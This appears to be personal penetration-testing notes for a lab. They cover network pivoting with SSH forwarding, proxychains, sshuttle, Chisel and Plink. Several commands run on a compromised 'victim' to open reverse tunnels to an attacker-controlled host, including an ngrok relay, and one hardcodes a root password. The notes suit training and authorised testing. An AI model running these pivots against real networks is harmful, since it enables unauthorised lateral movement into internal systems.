
<https://cheatsheet.haax.fr/network/pivot_techniques/>
<https://linuxize.com/post/how-to-setup-ssh-tunneling/#dynamic-port-forwarding>
<https://ironhackers.es/cheatsheet/port-forwarding-cheatsheet/>

ss -ltu
ss -tu
netstat -atop
netstat -tulpn
# SSH
Dynamic port forwarding: (use proxychains with e.g nmap)
ssh -N -D 1080 sean@10.11.1.251
(useful for debugging)
ssh -D 1080 -N sean@10.11.1.251 -vv        
(backgrounds process and uses port 22000)
ssh -D 1080 -N -f j0hn@10.11.1.252 -p 22000      
(compresses data, might be useful for speed, test)     
ssh -C -N -D 1080 sean@10.11.1.251       

## Double Pivoting:
<https://guif.re/networkpentest#Double-pivoting>
(get into it network)
ssh -N -D 127.0.0.1:1080 sean@10.11.1.251
then use that access to reach admin network
proxychains ssh -N -D 1081 mario@10.1.1.1 -p 222
now edit proxychains and override 1080 port with 1081 in thsi sequence, and you have now successfully double pivoted
proxychains -q nmap -sT -Pn 10.3.3.14 --top-ports=100 -v

# SShuttle

(With this you can the network without proxychains, just running normal commands
ex: nmap -p 22,23,2021,2110,389,25,8000 10.1.1.65 --open -sV -Pn -sT)
sshuttle -r sean@10.11.1.251 10.1.1.0/24


single port forwards port 80 from them to port 81 to our localhost:
ssh -N -L 81:127.0.0.1:80 sean@10.11.1.251

This is definitely more advanced. It's assumed have a proxychains session through some ssh tunnel to reach into new network. This particukal machine is the next machine we're attacking in our newly discovered network. This command does a local port forward from megans ssh session to our localhost, bringing us the NFS service we can potentially exploit, depending on it's configuration.
proxychains ssh -N megan@10.1.1.27 -L 2049:127.0.0.1:2049 

====
# Chisel

<https://github.com/jpillora/chisel/releases>

32 bit version:
<https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz>

### DYNAMIC SOCKS TUNNELING:
On victim machine: (the socks5 uses port 1080 by default. We'll be running our traffic through proxychains to be able to use our tools)
chisel64 client 0.tcp.eu.ngrok.io:18125 R:socks

On attacking machine (host): 
chisel32 server -p 8081 --reverse

### REVERSE SINGLE PORT FORWARDING:
port forwarding
chisel.exe client 192.168.119.148:12312 R:445:127.0.0.1:445
chisel server -p 12312 --reverse

target:
./chisel32 client 192.168.1.42:8081 R:8000:127.0.0.1:8080
attacker:
chisel server -p 8081 --reverse
====
# Plink

Make sure you have ssh server isntalled:
sudo apt install openssh-server
check local connections:
ss -lntu
start ssh server:
sudo systemctl start ssh
check local connections again:
ss -lntu
now we have ssh listening and ready for connections

Use plink like this: (on windows victim)
./plink32.exe -ssh -l root -pw password123 -N -R 10.13.31.108:2805:127.0.0.1:2805 10.13.31.108
or
echo y |& ./plink32.exe -ssh -l root -pw password123 -N -R 10.13.31.108:2805:127.0.0.1:2805 10.13.31.108

For Burp Suite, see here: [[Burp Suite]]